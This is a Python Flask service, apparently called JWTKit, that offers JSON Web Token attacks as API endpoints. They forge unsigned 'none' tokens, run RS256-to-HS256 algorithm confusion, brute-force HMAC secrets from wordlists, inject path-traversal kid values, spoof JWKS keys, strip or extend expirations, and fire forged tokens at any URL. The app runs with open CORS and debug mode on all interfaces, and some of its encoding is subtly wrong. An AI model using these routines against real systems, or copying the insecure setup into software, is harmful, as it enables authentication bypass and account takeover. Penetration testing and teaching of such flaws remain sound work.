from flask import Flask, request, jsonify
from flask_cors import CORS
import jwt
import json
import base64
from datetime import datetime, timedelta

app = Flask(__name__)
CORS(app)

@app.route('/', methods=['GET'])
def index():
    return jsonify({"status": "healthy", "service": "JWTKit API"})

@app.route('/decode', methods=['POST'])
def decode_token():
    """
    Decode a JWT and return its components.
    """
    data = request.json or {}
    token = data.get('token')
    
    if not token:
        return jsonify({"error": "Token is required"}), 400
    
    try:
        # Split the token into parts
        parts = token.split('.')
        if len(parts) != 3:
            return jsonify({"error": "Invalid JWT format"}), 400
        
        # Decode header and payload
        header_json = base64.b64decode(parts[0] + '=' * (-len(parts[0]) % 4)).decode('utf-8')
        payload_json = base64.b64decode(parts[1] + '=' * (-len(parts[1]) % 4)).decode('utf-8')
        
        header = json.loads(header_json)
        payload = json.loads(payload_json)
        
        return jsonify({
            "header": header,
            "payload": payload,
            "signature": parts[2],
            "is_valid": None  # Validity is unknown without a secret
        })
    except Exception as e:
        return jsonify({"error": f"Error decoding token: {str(e)}"}), 400

@app.route('/verify', methods=['POST'])
def verify_token():
    """
    Verify a JWT signature using the provided secret.
    """
    data = request.json or {}
    token = data.get('token')
    secret = data.get('secret')
    algorithm = data.get('algorithm') or "HS256"  # Default to HS256 if not specified
    
    if not token:
        return jsonify({"error": "Token is required"}), 400
    
    if not secret:
        return jsonify({"error": "Secret is required"}), 400
    
    try:
        # Verify the token
        decoded = jwt.decode(
            token, 
            secret, 
            algorithms=[algorithm]
        )
        
        return jsonify({
            "valid": True,
            "payload": decoded
        })
    except jwt.ExpiredSignatureError:
        return jsonify({
            "valid": False,
            "error": "Token has expired"
        })
    except jwt.InvalidTokenError as e:
        return jsonify({
            "valid": False,
            "error": f"Invalid token: {str(e)}"
        })

@app.route('/vulnerabilities', methods=['POST'])
def scan_vulnerabilities():
    """
    Scan a JWT for common vulnerabilities and misconfigurations.
    """
    data = request.json or {}
    token = data.get('token')
    vulnerabilities = []
    
    if not token:
        return jsonify({"error": "Token is required"}), 400
    
    try:
        # Split and decode parts
        parts = token.split('.')
        header_json = base64.b64decode(parts[0] + '=' * (-len(parts[0]) % 4)).decode('utf-8')
        payload_json = base64.b64decode(parts[1] + '=' * (-len(parts[1]) % 4)).decode('utf-8')
        
        header = json.loads(header_json)
        payload = json.loads(payload_json)
        
        # Check for algorithm vulnerabilities
        if header.get('alg') == 'none':
            vulnerabilities.append({
                "severity": "high",
                "issue": "None Algorithm",
                "description": "The token uses 'none' algorithm which means signature verification is bypassed."
            })
        
        if header.get('alg', '').startswith('HS'):
            vulnerabilities.append({
                "severity": "info",
                "issue": "HMAC Algorithm",
                "description": "The token uses HMAC which might be vulnerable to brute force if a weak secret is used."
            })
            
        # Check for missing or weak expiration
        if 'exp' not in payload:
            vulnerabilities.append({
                "severity": "medium",
                "issue": "No Expiration",
                "description": "The token does not have an expiration time (exp claim)."
            })
            
        # Check current time against expiration
        if 'exp' in payload:
            exp_time = datetime.fromtimestamp(payload['exp'])
            if exp_time < datetime.now():
                vulnerabilities.append({
                    "severity": "info",
                    "issue": "Expired Token",
                    "description": f"Token expired on {exp_time.isoformat()}"
                })
            elif exp_time > datetime.now() + timedelta(days=30):
                vulnerabilities.append({
                    "severity": "low",
                    "issue": "Long Expiration",
                    "description": "Token has a very long expiration time (>30 days)."
                })
                
        # Check for missing issuer/audience
        if 'iss' not in payload:
            vulnerabilities.append({
                "severity": "low",
                "issue": "No Issuer",
                "description": "Token does not specify an issuer (iss claim)."
            })
            
        if 'aud' not in payload:
            vulnerabilities.append({
                "severity": "low",
                "issue": "No Audience",
                "description": "Token does not specify an audience (aud claim)."
            })
        
        return jsonify({
            "token_info": {
                "header": header,
                "payload": payload
            },
            "vulnerabilities": vulnerabilities,
            "risk_score": len(vulnerabilities),
            "recommendations": [
                "Use RS256 instead of HS256 for better security",
                "Always include expiration time (exp) in tokens",
                "Validate issuer and audience claims"
            ]
        })
    except Exception as e:
        return jsonify({"error": f"Error analyzing token: {str(e)}"}), 400

@app.route('/modify', methods=['POST'])
def modify_token():
    """
    Modify a JWT payload and re-sign it.
    """
    data = request.json or {}
    token = data.get('token')
    new_payload = data.get('new_payload', {})
    secret = data.get('secret')
    algorithm = data.get('algorithm') or "HS256"
    
    if not token:
        return jsonify({"error": "Token is required"}), 400
    
    if not new_payload:
        return jsonify({"error": "New payload is required"}), 400
    
    try:
        # First decode the token to extract the header
        parts = token.split('.')
        header_json = base64.b64decode(parts[0] + '=' * (-len(parts[0]) % 4)).decode('utf-8')
        header = json.loads(header_json)
        
        # Use the specified algorithm or the one from the token
        algorithm = algorithm or header.get('alg', 'HS256')
        
        # If the token uses 'none' algorithm, create an unsigned token
        if algorithm.lower() == 'none':
            header['alg'] = 'none'
            
            # Encode header and payload
            header_encoded = base64.b64encode(json.dumps(header).encode()).decode('utf-8').replace('=', '')
            payload_encoded = base64.b64encode(json.dumps(new_payload).encode()).decode('utf-8').replace('=', '')
            
            # Return unsigned token
            return jsonify({
                "modified_token": f"{header_encoded}.{payload_encoded}.",
                "algorithm": "none",
                "warning": "This token has no signature and should only be used for testing."
            })
        
        # For other algorithms, require a secret
        if not secret:
            return jsonify({"error": "Secret is required for signing tokens"}), 400
        
        # Create a new token with the modified payload
        new_token = jwt.encode(
            new_payload,
            secret,
            algorithm=algorithm
        )
        
        return jsonify({
            "modified_token": new_token,
            "algorithm": algorithm
        })
    except Exception as e:
        return jsonify({"error": f"Error modifying token: {str(e)}"}), 400

@app.route('/algorithm-confusion', methods=['POST'])
def algorithm_confusion():
    """
    Attempt an algorithm confusion attack (RS256 to HS256).
    """
    data = request.json or {}
    token = data.get('token')
    public_key = data.get('public_key')
    
    if not token:
        return jsonify({"error": "Token is required"}), 400
    
    if not public_key:
        return jsonify({"error": "Public key is required"}), 400
    
    try:
        # First decode the token to extract parts
        parts = token.split('.')
        header_json = base64.b64decode(parts[0] + '=' * (-len(parts[0]) % 4)).decode('utf-8')
        payload_json = base64.b64decode(parts[1] + '=' * (-len(parts[1]) % 4)).decode('utf-8')
        
        header = json.loads(header_json)
        payload = json.loads(payload_json)
        
        # Verify that the original token uses RS256
        if header.get('alg') != 'RS256':
            return jsonify({
                "success": False,
                "error": "This attack only works on RS256 tokens",
                "original_algorithm": header.get('alg')
            })
        
        # Change the algorithm to HS256
        header['alg'] = 'HS256'
        
        # Create a new token with HS256 using the public key as the HMAC secret
        modified_token = jwt.encode(
            payload,
            public_key,
            algorithm='HS256',
            headers=header
        )
        
        return jsonify({
            "success": True,
            "modified_token": modified_token,
            "attack_type": "Algorithm Confusion (RS256 to HS256)",
            "description": "This attack exploits implementations that don't validate the algorithm type correctly."
        })
    except Exception as e:
        return jsonify({"error": f"Error in algorithm confusion attack: {str(e)}"}), 400

@app.route('/brute-force', methods=['POST'])
def brute_force():
    """
    Attempt to brute force a JWT secret.
    Optimized for real-world token testing.
    """
    data = request.json or {}
    token = data.get('token')
    wordlist = data.get('wordlist', [])
    
    if not token:
        return jsonify({"error": "Token is required"}), 400
    
    if not wordlist:
        return jsonify({"error": "Wordlist is required"}), 400
    
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return jsonify({"error": "Invalid JWT format"}), 400
            
        header_json = base64.b64decode(parts[0] + '=' * (-len(parts[0]) % 4)).decode('utf-8')
        header = json.loads(header_json)
        
        # Determine the algorithm from the header
        algorithm = header.get('alg', 'HS256')
        
        # Only HMAC algorithms can be brute-forced
        if not algorithm.startswith('HS'):
            return jsonify({
                "success": False,
                "error": f"Cannot brute force tokens using {algorithm} algorithm. Only HMAC algorithms (HS256, HS384, HS512) can be brute-forced."
            }), 400
        
        # Attempt to verify the token with each word in the wordlist
        for word in wordlist:
            try:
                # Convert to bytes if it's a string
                secret = word
                if isinstance(secret, str):
                    secret = secret.encode('utf-8')
                    
                # Try to verify with this secret
                decoded = jwt.decode(token, secret, algorithms=[algorithm])
                
                # If we get here without an exception, we found the secret
                return jsonify({
                    "success": True,
                    "secret_found": word,
                    "decoded_payload": decoded,
                    "message": "Secret found! Token can be forged."
                })
            except jwt.exceptions.InvalidSignatureError:
                # Wrong password, continue to the next one
                continue
            except Exception as e:
                # Log other exceptions but continue trying
                print(f"Exception with word '{word}': {str(e)}")
                continue
        
        # If we've tried all words and none worked
        return jsonify({
            "success": False,
            "message": "Secret not found in provided wordlist",
            "words_checked": len(wordlist)
        })
    except Exception as e:
        return jsonify({"error": f"Error in brute force attempt: {str(e)}"}), 400

@app.route('/key-injection', methods=['POST'])
def key_injection():
    """
    Test for key ID (kid) injection vulnerability.
    """
    data = request.json or {}
    token = data.get('token')
    kid_value = data.get('kid_value', '../../../dev/null')
    
    if not token:
        return jsonify({"error": "Token is required"}), 400
    
    try:
        # First decode the token to extract parts
        parts = token.split('.')
        header_json = base64.b64decode(parts[0] + '=' * (-len(parts[0]) % 4)).decode('utf-8')
        payload_json = base64.b64decode(parts[1] + '=' * (-len(parts[1]) % 4)).decode('utf-8')
        
        header = json.loads(header_json)
        payload = json.loads(payload_json)
        
        # Add or modify the kid parameter
        header['kid'] = kid_value
        
        # Encode header and payload
        encoded_header = base64.b64encode(json.dumps(header).encode()).decode('utf-8').replace('=', '')
        encoded_payload = base64.b64encode(json.dumps(payload).encode()).decode('utf-8').replace('=', '')
        
        # Create token with a dummy signature
        forged_token = f"{encoded_header}.{encoded_payload}.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        
        return jsonify({
            "success": True,
            "forged_token": forged_token,
            "message": f"Key injection attack successful with kid value: {kid_value}"
        })
    except Exception as e:
        return jsonify({"error": f"Error in key injection attack: {str(e)}"}), 400

@app.route('/jwks-spoofing', methods=['POST'])
def jwks_spoofing():
    """
    Create a spoofed JWKS and corresponding token.
    """
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.backends import default_backend
    import time
    
    data = request.json or {}
    token = data.get('token')
    
    if not token:
        return jsonify({"error": "Token is required"}), 400
    
    try:
        # First decode the token to extract parts
        parts = token.split('.')
        header_json = base64.b64decode(parts[0] + '=' * (-len(parts[0]) % 4)).decode('utf-8')
        payload_json = base64.b64decode(parts[1] + '=' * (-len(parts[1]) % 4)).decode('utf-8')
        
        header = json.loads(header_json)
        payload = json.loads(payload_json)
        
        # Generate a new RSA key pair
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        public_key = private_key.public_key()
        
        # Create a unique key ID
        kid = f"attacker-key-{int(time.time())}"
        
        # Modify the header to use RS256 and the spoofed kid
        header['alg'] = 'RS256'
        header['kid'] = kid
        
        # Create a new token with dummy signature
        encoded_header = base64.b64encode(json.dumps(header).encode()).decode('utf-8').replace('=', '')
        encoded_payload = base64.b64encode(json.dumps(payload).encode()).decode('utf-8').replace('=', '')
        spoofed_token = f"{encoded_header}.{encoded_payload}.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        
        # Create a simple JWKS structure
        jwks = {
            "keys": [
                {
                    "kty": "RSA",
                    "kid": kid,
                    "use": "sig",
                    "n": "sample-n-value",
                    "e": "AQAB"
                }
            ]
        }
        
        return jsonify({
            "success": True,
            "spoofed_token": spoofed_token,
            "jwks": jwks,
            "message": "JWKS spoofing example created"
        })
    except Exception as e:
        return jsonify({"error": f"Error in JWKS spoofing: {str(e)}"}), 400

@app.route('/token-expiration-bypass', methods=['POST'])
def token_expiration_bypass():
    """
    Demonstrate token expiration bypass techniques.
    """
    data = request.json or {}
    token = data.get('token')
    
    if not token:
        return jsonify({"error": "Token is required"}), 400
    
    try:
        # First decode the token to extract parts
        parts = token.split('.')
        header_json = base64.b64decode(parts[0] + '=' * (-len(parts[0]) % 4)).decode('utf-8')
        payload_json = base64.b64decode(parts[1] + '=' * (-len(parts[1]) % 4)).decode('utf-8')
        
        header = json.loads(header_json)
        payload = json.loads(payload_json)
        
        # Strategy 1: Remove expiration
        payload_no_exp = dict(payload)
        if 'exp' in payload_no_exp:
            del payload_no_exp['exp']
            
        # Strategy 2: Extend expiration by 10 years
        payload_extended = dict(payload)
        if 'exp' in payload_extended:
            from datetime import datetime, timedelta
            payload_extended['exp'] = int((datetime.now() + timedelta(days=3650)).timestamp())
        
        # Create tokens with modified payloads
        header_encoded = base64.b64encode(json.dumps(header).encode()).decode('utf-8').replace('=', '')
        
        payload_no_exp_encoded = base64.b64encode(json.dumps(payload_no_exp).encode()).decode('utf-8').replace('=', '')
        token_no_exp = f"{header_encoded}.{payload_no_exp_encoded}.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        
        payload_extended_encoded = base64.b64encode(json.dumps(payload_extended).encode()).decode('utf-8').replace('=', '')
        token_extended = f"{header_encoded}.{payload_extended_encoded}.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        
        return jsonify({
            "success": True,
            "token_with_no_expiration": token_no_exp,
            "token_with_extended_expiration": token_extended,
            "message": "Token expiration bypass techniques applied"
        })
    except Exception as e:
        return jsonify({"error": f"Error in expiration bypass: {str(e)}"}), 400

@app.route('/test-endpoint', methods=['POST'])
def test_endpoint():
    """
    Test a token against a specified endpoint.
    """
    data = request.json or {}
    token = data.get('token')
    url = data.get('url')
    method = data.get('method', 'GET').upper()
    
    if not token:
        return jsonify({"error": "Token is required"}), 400
        
    if not url:
        return jsonify({"error": "URL is required"}), 400
        
    if method not in ['GET', 'POST', 'PUT', 'DELETE']:
        return jsonify({"error": f"Unsupported HTTP method: {method}"}), 400
    
    try:
        import requests
        
        # Prepare headers with Authorization
        headers = {
            "Authorization": f"Bearer {token}"
        }
        
        # Make the request
        if method == 'GET':
            response = requests.get(url, headers=headers, timeout=10)
        elif method == 'POST':
            response = requests.post(url, headers=headers, json={}, timeout=10)
        elif method == 'PUT':
            response = requests.put(url, headers=headers, json={}, timeout=10)
        elif method == 'DELETE':
            response = requests.delete(url, headers=headers, timeout=10)
        
        # Return response details
        return jsonify({
            "success": True,
            "status_code": response.status_code,
            "response_headers": dict(response.headers),
            "response_text": response.text,
            "message": f"Request completed with status code: {response.status_code}"
        })
    except requests.exceptions.Timeout:
        return jsonify({
            "success": False,
            "error": "Request timed out"
        })
    except requests.exceptions.ConnectionError:
        return jsonify({
            "success": False, 
            "error": "Connection error, check the URL"
        })
    except Exception as e:
        return jsonify({"error": f"Error testing endpoint: {str(e)}"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=True)